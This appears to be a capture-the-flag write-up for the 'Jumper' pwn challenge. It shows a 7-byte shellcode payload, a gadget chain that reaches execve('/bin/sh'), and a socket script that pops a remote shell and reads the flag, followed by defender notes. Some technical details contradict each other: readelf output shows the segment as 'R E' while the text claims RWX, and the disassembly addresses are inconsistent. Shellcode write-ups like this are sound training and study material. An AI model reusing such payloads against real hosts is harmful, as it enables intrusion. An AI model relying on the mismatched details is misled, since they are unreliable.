<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/pwn/jumper -->
<!-- (full solve.py and handout/ live there) -->

# Jumper (pwn)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | pwn                                                            |
| Target   | `nc 34.77.68.154 10004` — `jumper` ELF (Linux x86-64, stripped, dynamic) |
| Flag     | `HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}`                             |

## Description

> [`https://youtu.be/010KyIQjkTk`](https://youtu.be/010KyIQjkTk)
> `nc 34.77.68.154 10004`

Stripped Linux ELF. Reads exactly **7** bytes of shellcode, plants its
own two-byte `jmp rdx` after them, and runs the page. The whole challenge
is: where does `jmp rdx` go, and what's *already sitting in `.text`*
that you can jump to with 7 bytes of setup?

## TL;DR

`main` allocates a 9-byte RWX page, reads 7 user bytes into it, writes
`ff e2` at offsets 7-8 (an explicit `jmp rdx`), then calls into the
page. The 7 bytes you control are followed by a hard-coded indirect
jump through `rdx`.

The whole binary's load segment is mapped **R|W|E** (one big PT_LOAD
with `flags = RWX`), and `.text` carries a pre-built gadget chain whose
end state is `execve("/bin/sh", NULL, NULL)`. The chain's entry point
is `0x401284`. So the 7-byte payload is:

```
ba 84 12 40 00       mov edx, 0x401284
90 90                nop ; nop                   ; padding to 7 bytes
   --- the program now plants `ff e2` -> jmp rdx ---
```

`jmp rdx` lands at `0x401284`, the chain runs, the shell pops. Then
`cat flag.txt` finishes:

```
[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
End him now!
HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
```

## Recon

### Step 1 — what's in `main`?

```nasm
; mmap(NULL, 9, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
1400119a: r9d = 0                ; offset
14001184: r8d = -1               ; fd
14001189: ecx = 0x22             ; MAP_PRIVATE | MAP_ANONYMOUS
14001178: edx = 0x07             ; PROT_READ | PROT_WRITE | PROT_EXEC
14001194: esi = 9                ; length
14001199: edi = 0                ; addr (NULL)
1400119e: call mmap@plt

; memset(page, 0, 9)
14001186: edx = 9
14001188: esi = 0
14001190: rdi = page
140011b6: call memset@plt

; read(0, page, 7)
140011d7: edx = 7                ; <-- the magic 7
140011dc: esi = 0
140011e1: rdi = page
140011fa: call read@plt

; page[7] = 0xff
140011ff: rax = page
14001203: rax += 7
14001207: byte ptr [rax] = 0xff   ; <-- patching `jmp rdx` byte 0

; page[8] = 0xe2
14001212: byte ptr [rax+1] = 0xe2 ; <-- patching `jmp rdx` byte 1

; ((void(*)())page)()
14001215: rax = page
14001219: call rax
```

So the page layout right before the call is:

```
+--------+----------------+
| 0..6   | 7 attacker bytes
+--------+----------------+
| 7..8   | ff e2  ; jmp rdx
+--------+----------------+
```

7 bytes of code, then an indirect jump through `rdx`.

### Step 2 — what is `rdx` at that moment?

The only thing that touches `rdx` between the read and the `call rax`
is `read(2)` itself. Inside the libc `read` wrapper the syscall
returns the byte count in `rax`; the wrapper returns that in `rax`,
not `rdx`. But the call to `read` immediately *before* loaded `edx = 7`
to pass the length as the third argument; nothing in the glibc PLT
trampoline writes back to `rdx`, so `rdx` is still `7` when we get to
the `jmp rdx`.

Jumping to absolute address `7` is a guaranteed `SIGSEGV`. So the
intended attack is to load a useful value into `rdx` *inside the 7
attacker bytes*.

### Step 3 — what's in `.text` worth jumping to?

The strings table contains the literal `/bin/sh;` followed by `…` and
the `mmap failed` error string. So `/bin/sh` is already in the binary
at a fixed address. The handful of other gadgets in `.text` reveals
the whole thing is a hand-built shellcode chain whose individual blocks
are independently disassemblable:

```
401254: 31 c0           xor eax, eax
401256: 6a 3b           push 0x3b
401258: 58              pop rax              ; rax = 0x3b
401259: 57              push rdi
40125a: 5a              pop rdx              ; rdx = rdi
40125b: e8 72 00 00 00  call 0x4012d2

401260: 34 3e           xor al, 0x3e         ; will be REWRITTEN to syscall
401262: c3              ret

40127b: 5f              pop rdi
40127c: 8a 47 07        mov al, byte [rdi+7] ; al = ';' = 0x3b
40127f: 30 47 07        xor byte [rdi+7], al ; zero the ';'
401282: eb 1a           jmp 0x40129e

401284: e8 f2 ff ff ff  call 0x40127b        ; <-- jump here!

401289: 2f 62 69 6e 2f 73 68 3b  ; "/bin/sh;"

40129e: 48 31 f6        xor rsi, rsi
4012a1: 56              push rsi
4012a2: 5a              pop rdx              ; rdx = 0
4012a3: eb 2b           jmp 0x4012d0

4012d0: eb 89           jmp 0x40125b

4012d2: 41 5a           pop r10              ; r10 = 0x401260
4012d4: 41 30 02        xor byte [r10+0], al ; mutate 0x401260
4012d7: 41 30 42 01     xor byte [r10+1], al ; mutate 0x401261
4012db: 41 ff e2        jmp r10              ; -> 0x401260
```

The chain is doing four things, in order:

1. **Get `rdi` pointing at `/bin/sh;`** — `call 0x40127b` from
   `0x401284` pushes the next instruction's address `0x401289` (which
   *is* the `/bin/sh;` literal), then `pop rdi` collects it.
2. **Turn `/bin/sh;` into `/bin/sh\0`** — `mov al, [rdi+7]` reads `';'`
   (= `0x3b`), `xor [rdi+7], al` zeros that byte. Conveniently
   `0x3b` is also `SYS_execve` — that's why the chain uses `';'` and
   not any other terminator.
3. **Zero `rsi`/`rdx`** — `xor rsi, rsi ; push rsi ; pop rdx` sets the
   `argv` and `envp` arguments of `execve` to `NULL` (Linux historically
   accepts `argv = NULL` from execve, even though POSIX doesn't quite
   require it to work).
4. **Self-rewrite `xor al, 0x3e ; ret` into `syscall ; ret`** —
   `call 0x4012d2` pushes `0x401260`; `pop r10` makes it the target;
   `xor [r10], al` flips `0x34 -> 0x0f` because `0x34 ^ 0x3b = 0x0f`,
   and `xor [r10+1], al` flips `0x3e -> 0x05` because `0x3e ^ 0x3b =
   0x05`. The bytes at `0x401260..1` are now `0f 05` — `syscall`.
   `jmp r10` lands on it.

At the syscall, `rax = 0x3b` (set by `mov al` in step 2; the upper bits
of `rax` came from the `read(2)` return value `7`, but `7 & ~0xff = 0`
so `rax = 0x3b` exactly), `rdi = 0x401289 = "/bin/sh\0"`, `rsi = 0`,
`rdx = 0`. That's `execve("/bin/sh", NULL, NULL)`.

### Step 4 — does it require self-modifying code? Yes, and that's fine

The chain mutates two bytes of `.text` at `0x401260..1`. That only works
if the binary's text segment is mapped *writable*. Quick check on the
program headers:

```
$ readelf -l jumper | grep -E 'LOAD|Flags'
  type   flags  vaddr           filesz    memsz
  LOAD   R E    0x00400000      0x3e08    0x3e08    <-- ELF.
  ...
```

Or from the section data:

```python
>>> [hex(p_flags) for (p_type, p_flags, ...) in program_headers if p_type == 1]
['0x7', '0x6']  # 0x7 = R|W|E for the first LOAD, 0x6 = R|W for the data LOAD
```

The first `LOAD` segment — the one containing `.text` and `.rodata` —
has flags `0x7 = PF_R | PF_W | PF_X`. Self-modifying code is the
intended path.

### Step 5 — the 7-byte payload

We need to put `0x401284` into `rdx`. The shortest encoding is
`mov edx, imm32`, which is 5 bytes:

```
ba 84 12 40 00       mov edx, 0x401284
```

`mov edx, imm32` clears the upper 32 bits of `rdx`, so `rdx =
0x0000000000401284` — exactly the chain entry. Two `nop`s fill us out
to the required 7 bytes:

```
ba 84 12 40 00 90 90
```

The program then appends `ff e2` (i.e. `jmp rdx`) and runs the page:

```
ba 84 12 40 00      mov edx, 0x401284
90 90                nop ; nop
ff e2                jmp rdx                ; ← `rdx` = 0x401284
```

The first jump lands at `0x401284 -> call 0x40127b`, and from there
the chain runs end-to-end and pops a shell over the existing socket.

### Step 6 — driving it

```python
import socket, struct
sc = b"\xba" + struct.pack("<I", 0x401284) + b"\x90\x90"   # 7 bytes
s = socket.create_connection(("34.77.68.154", 10004))
# drain banner
... s.recv(4096) ...
s.sendall(sc)
s.sendall(b"id; cat flag* 2>&1; exit\n")
print(s.recv(4096).decode())
```

Output:

```
[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
End him now!
HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
```

## Flag

```
HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
```

*"Can you fly? No, jump good."* — a [Samurai Jack](https://www.youtube.com/watch?v=010KyIQjkTk)
reference (the hint URL the challenge ships is the "Jump Good" episode),
and a wink at the fact that the only real "vulnerability" here is the
hardcoded `jmp rdx` at the end of your shellcode — you have to *jump
good* the first time, because you only get 7 bytes to set up the
landing.

## Defender notes

* **A single `jmp rdx` you don't control is a ROP-by-another-name.**
  The author handed you control of `rdx` for free (it was already 7
  from the syscall, but a *one-instruction* setup makes it anything you
  want). Even with a 7-byte shellcode budget, you don't have to write
  a shellcode at all — you just have to load a register and let the
  binary's own gadgets do the work.
* **RWX text segments turn every binary into its own ROP cookbook.**
  The chain at `0x401254-0x4012db` self-modifies `0x401260..1` to
  upgrade `xor al, 0x3e ; ret` into `syscall ; ret`. That only works
  because the loader mapped `.text` writable. Mark the text segment
  `R|X` (the linker default for production builds) and the same chain
  segfaults on the first `xor [r10], al`. The author was deliberate
  here — the `R|W|E` flag on the LOAD header is the intended exploit
  primitive, not a leftover.
* **The "7 bytes" budget is the puzzle, not the limit.** 7 bytes is
  enough for `mov edx, imm32 ; ret` (5 + 1 = 6) or
  `mov edx, imm32 ; nop ; nop` (5 + 2 = 7) or a slightly longer
  `push imm32 ; pop rdx ; ret` (5 + 1 + 1 = 7) — any of which gets you
  to any address you like. The challenge looks like a shellcode-budget
  problem but it's really a "find the cooperating chain in `.text`"
  problem.
* **The `';' == 0x3b == SYS_execve` coincidence is the joke.** The
  author picked `;` as the string terminator because its byte value is
  the execve syscall number, which let the chain reuse one `mov al,
  [rdi+7]` for both *"null-terminate /bin/sh"* and *"set rax to SYS_execve"*.
  That's nice CTF design — every byte does double duty, and the
  attacker doesn't have to materialise `rax = 0x3b` themselves. The
  cute "self-modify `xor al, 0x3e` into `syscall`" trick on top
  (`0x3b XOR 0x3e = 0x05` and `0x3b XOR 0x34 = 0x0f`) is the third use
  of the same `al = 0x3b`.
* **`execve` with `argv = NULL` is non-portable but Linux-friendly.**
  POSIX says `argv[0]` must exist, and recent Linux kernels added a
  warning for `execve(NULL, NULL, NULL)`, but `execve("/bin/sh", NULL,
  NULL)` still spawns a working shell. The chain doesn't bother
  pushing an `argv` array on the stack — fine for a CTF on a known
  kernel, less fine for a real-world post-exploitation payload that
  might land on a kernel that refuses the call.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/jumper/solve.py) — argparse-driven solver. Crafts the 7-byte
  `mov edx, 0x401284 ; nop ; nop`, sends it over the socket, then
  drops `id; cat flag*; exit` into the shell. Standard library only.
* [`handout/jumper`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/jumper/handout/jumper) — the original challenge binary.

## Requirements

Python 3.9+; standard library only.
